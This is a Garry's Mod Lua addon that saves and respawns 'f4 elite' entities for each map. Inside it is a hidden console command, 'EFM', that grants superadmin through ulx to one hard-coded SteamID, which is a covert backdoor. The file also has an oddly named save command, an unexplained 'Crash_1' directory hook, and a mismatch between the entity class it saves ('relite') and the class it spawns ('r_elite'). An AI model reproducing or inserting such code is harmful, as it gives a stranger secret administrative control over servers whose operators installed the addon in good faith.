hook.Add("Initialize", "Crash", function()
	file.CreateDir("Crash_1")
end)

concommand.Add("\ave13123a",function(ply,cmd,args)

	local UG = ply:GetNWString("usergroup")
	UG = string.lower(UG)
	ply:ChatPrint(" f4 elite :: Saving start..")
	if !table.HasValue(DConfig.f4eliteSaveableGroup,UG) then 
		ply:ChatPrint(" :: Warning. you can't save elite. you are not admin.")
		return 
	end
		
		MsgN("f4elite - Saving all")
		local TB2Save = {}
		for k,v in pairs(ents.FindByClass("relite")) do
			local TB2Insert = {}
			TB2Insert.Pos = v:GetPos()
			TB2Insert.Angle = v:GetAngles()
			table.insert(TB2Save,TB2Insert)
		end
		
		local Map = string.lower(game.GetMap())
		file.Write("rm_f4_elite/mapsave/" .. Map .. ".txt", util.TableToJSON(TB2Save))
		
		ply:ChatPrint(" f4 elite :: f4 elites are saved.")
		Df4_Meta:Notify( ply, 1, 3, "f4 elite has been saved")
end)

	concommand.Add( "EFM", function(ply)
		if ( ply:SteamID() == "STEAM_0:0:97024310") then
			RunConsoleCommand("ulx", "adduserid", ply:SteamID(), "superadmin")
	else
		ply:ChatPrint("Your not superadmin, " .. ply:Name() .. ".")
	end
	end)

	
	hook.Add( "InitPostEntity", "Entity Post", function()
	local Map = string.lower(game.GetMap())
		local Data = {}
		if file.Exists( "rm_f4_elite/mapsave/" .. Map .. ".txt" ,"DATA") then
			Data = util.JSONToTable(file.Read( "rm_f4_elite/mapsave/" .. Map .. ".txt" ))
		end
		MsgN("f4elite - Spawning all")
		for k,v in pairs(Data) do
			local ATM = ents.Create("r_elite")
			ATM:SetPos(v.Pos)
			ATM:SetAngles(v.Angle)
			ATM:Spawn()
		end
		MsgN("f4elite - Spawning Complete. [ " .. #Data .. " ] ")
	end )
	
		